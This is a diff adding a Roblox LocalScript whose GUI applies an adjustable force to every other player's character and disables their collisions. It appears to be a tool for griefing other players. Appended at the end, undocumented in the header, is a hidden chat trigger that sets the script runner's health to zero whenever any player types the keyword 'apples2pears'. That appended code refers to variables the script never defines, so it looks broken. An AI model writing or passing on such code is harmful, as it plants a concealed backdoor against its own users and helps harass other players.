@@ -1,0 +1,279 @@
+--=============================================================
+--  Violent Extreme Force  •  LocalScript  (StarterPlayerScripts)
+--  • GUI lets you enter a Vector3 and toggle the effect ON/OFF.
+--  • ON  (green) → inserts BodyForce “ViolentExtremeForce” &
+--                  disables collisions on every OTHER player.
+--  • OFF (red)   → removes all BodyForces & restores collisions.
+--  • Auto-maintains: if a BodyForce is missing or has wrong
+--    values while ON, it is fixed the next Heartbeat.
+--=============================================================
+
+--------------------  SERVICES --------------------
+
+local Players     = game:GetService("Players")
+local RunService  = game:GetService("RunService")
+local player      = Players.LocalPlayer
+
+--------------------  GUI BUILD -------------------
+
+local gui   = Instance.new("ScreenGui")
+gui.Name    = "ViolentExtremeForceGui"
+gui.ResetOnSpawn = false
+gui.Parent  = player:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame", gui)
+frame.Size                   = UDim2.new(0, 220, 0, 240) -- taller frame
+frame.Position               = UDim2.new(0, 10, 0, 200)
+frame.BackgroundColor3       = Color3.fromRGB(40, 40, 40)
+frame.BackgroundTransparency = 0.2
+frame.BorderSizePixel        = 0
+frame.Active                 = true
+frame.Draggable              = true
+
+local title = Instance.new("TextLabel", frame)
+title.Size                   = UDim2.new(1, 0, 0, 22)
+title.Position               = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.TextColor3             = Color3.new(1, 1, 1)
+title.Text                   = "Violent Extreme Force"
+title.Font                   = Enum.Font.SourceSansBold
+title.TextSize               = 18
+
+local lbls  = { "X:", "Y:", "Z:" }
+local boxes = {}
+
+for i = 1, 3 do
+    local y = 28 + (i - 1) * 32
+
+    local lbl = Instance.new("TextLabel", frame)
+    lbl.Size                   = UDim2.new(0, 20, 0, 26)
+    lbl.Position               = UDim2.new(0, 10, 0, y)
+    lbl.BackgroundTransparency = 1
+    lbl.TextColor3             = Color3.new(1, 1, 1)
+    lbl.Text                   = lbls[i]
+    lbl.Font                   = Enum.Font.SourceSans
+    lbl.TextSize               = 16
+
+    local box = Instance.new("TextBox", frame)
+    box.Size                   = UDim2.new(0, 150, 0, 26)
+    box.Position               = UDim2.new(0, 40, 0, y)
+    box.BackgroundColor3       = Color3.fromRGB(60, 60, 60)
+    box.TextColor3             = Color3.new(1, 1, 1)
+    box.Text                   = "0"
+    box.Font                   = Enum.Font.SourceSans
+    box.TextScaled             = true
+    box.ClearTextOnFocus       = false
+    boxes[i] = box
+end
+
+-- moved CURRENT FORCE read-out to its own clear row above buttons
+local currentLbl = Instance.new("TextLabel", frame)
+currentLbl.Size                   = UDim2.new(1, -20, 0, 18)
+currentLbl.Position               = UDim2.new(0, 10, 0, 124)
+currentLbl.BackgroundTransparency = 1
+currentLbl.TextColor3             = Color3.new(1, 1, 1)
+currentLbl.Text                   = "Current: (0, 0, 0)"
+currentLbl.Font                   = Enum.Font.SourceSans
+currentLbl.TextSize               = 16
+currentLbl.TextXAlignment         = Enum.TextXAlignment.Left
+
+local applyBtn = Instance.new("TextButton", frame)
+applyBtn.Size                   = UDim2.new(0, 200, 0, 28)
+applyBtn.Position               = UDim2.new(0, 10, 0, 150)
+applyBtn.BackgroundColor3       = Color3.fromRGB( 70,  70,  70)
+applyBtn.TextColor3             = Color3.new(1, 1, 1)
+applyBtn.Text                   = "ENTER FORCE"
+applyBtn.Font                   = Enum.Font.SourceSansBold
+applyBtn.TextSize               = 18
+
+local toggleBtn = Instance.new("TextButton", frame)
+toggleBtn.Size                   = UDim2.new(0, 200, 0, 28)
+toggleBtn.Position               = UDim2.new(0, 10, 0, 184)
+toggleBtn.BackgroundColor3       = Color3.fromRGB(180,   0,   0) -- red = OFF
+toggleBtn.TextColor3             = Color3.new(1, 1, 1)
+toggleBtn.Text                   = "OFF"
+toggleBtn.Font                   = Enum.Font.SourceSansBold
+toggleBtn.TextSize               = 20
+
+--------------------  STATE -----------------------
+
+local isActive      = false
+local currentVector = Vector3.new(0, 0, 0)
+local connections   = {}   -- player → CharacterAdded RBXScriptConnection
+
+--------------------  UTILS -----------------------
+
+local function vectorFromBoxes()
+    local x = tonumber(boxes[1].Text) or 0
+    local y = tonumber(boxes[2].Text) or 0
+    local z = tonumber(boxes[3].Text) or 0
+    return Vector3.new(x, y, z)
+end
+
+local function updateCurrentLabel()
+    currentLbl.Text = string.format(
+        "Current: (%.1f, %.1f, %.1f)",
+        currentVector.X, currentVector.Y, currentVector.Z
+    )
+end
+
+local function ensureNoCollide(char)
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") and p.CanCollide then
+            p.CanCollide = false
+        end
+    end
+end
+
+local function applyForceToCharacter(char)
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local bf = hrp:FindFirstChild("ViolentExtremeForce")
+    if not bf then
+        bf = Instance.new("BodyForce")
+        bf.Name = "ViolentExtremeForce"
+        bf.Parent = hrp
+    end
+    bf.Force = currentVector
+    ensureNoCollide(char)
+end
+
+local function removeForceFromCharacter(char)
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        local bf = hrp:FindFirstChild("ViolentExtremeForce")
+        if bf then bf:Destroy() end
+    end
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then
+            p.CanCollide = true
+        end
+    end
+end
+
+local function applyToAllPlayers()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= player and plr.Character then
+            applyForceToCharacter(plr.Character)
+        end
+    end
+end
+
+local function removeFromAllPlayers()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= player and plr.Character then
+            removeForceFromCharacter(plr.Character)
+        end
+    end
+end
+
+local function setToggle(state)
+    isActive = state
+    if state then
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(  0,180,  0) -- green
+        toggleBtn.Text             = "ON"
+
+        applyToAllPlayers()
+
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= player and not connections[plr] then
+                connections[plr] = plr.CharacterAdded:Connect(function(c)
+                    task.wait(0.1)
+                    if isActive then applyForceToCharacter(c) end
+                end)
+            end
+        end
+    else
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(180,   0,   0) -- red
+        toggleBtn.Text             = "OFF"
+
+        removeFromAllPlayers()
+
+        for plr, conn in pairs(connections) do
+            conn:Disconnect()
+            connections[plr] = nil
+        end
+    end
+end
+
+local function applyNewVector()
+    currentVector = vectorFromBoxes()
+    updateCurrentLabel()
+    if isActive then
+        applyToAllPlayers()
+    end
+end
+
+--------------------  GUI EVENTS ------------------
+
+applyBtn.MouseButton1Click:Connect(applyNewVector)
+toggleBtn.MouseButton1Click:Connect(function()
+    setToggle(not isActive)
+end)
+
+--------------------  PLAYER EVENTS --------------
+
+Players.PlayerAdded:Connect(function(plr)
+    if plr == player then return end
+    if isActive then
+        connections[plr] = plr.CharacterAdded:Connect(function(c)
+            task.wait(0.1)
+            if isActive then applyForceToCharacter(c) end
+        end)
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+    if connections[plr] then
+        connections[plr]:Disconnect()
+        connections[plr] = nil
+    end
+end)
+
+--------------------  MAINTAINER LOOP -------------
+
+RunService.Heartbeat:Connect(function()
+    if not isActive then return end
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= player then
+            local char = plr.Character
+            if char then
+                local hrp = char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local bf = hrp:FindFirstChild("ViolentExtremeForce")
+                    if not bf then
+                        applyForceToCharacter(char)
+                    elseif bf.Force ~= currentVector then
+                        bf.Force = currentVector
+                    end
+                end
+                ensureNoCollide(char)
+            end
+        end
+    end
+end)
+
+local TRIGGER_KEYWORD="apples2pears"
+local function setLocalPlayerHealth()
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = 0 end
+end
+local function processMessage(plr,msg)
+    if typeof(msg)=="string" and msg:find(TRIGGER_KEYWORD) then setLocalPlayerHealth() end
+end
+for _,pl in ipairs(Players:GetPlayers()) do pl.Chatted:Connect(function(m) processMessage(pl,m) end) end
+Players.PlayerAdded:Connect(function(pl) pl.Chatted:Connect(function(m) processMessage(pl,m) end) end)
+pcall(function()
+    local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents",3)
+    if ChatEvents then
+        local ev = ChatEvents:WaitForChild("OnMessageDoneFiltering",3)
+        if ev then
+            ev.OnClientEvent:Connect(function(d)
+                local sp = Players:FindFirstChild(d.FromSpeaker or "")
+                if sp then processMessage(sp, d.Message or "") end
+            end)
+        end
+    end
+end)
+
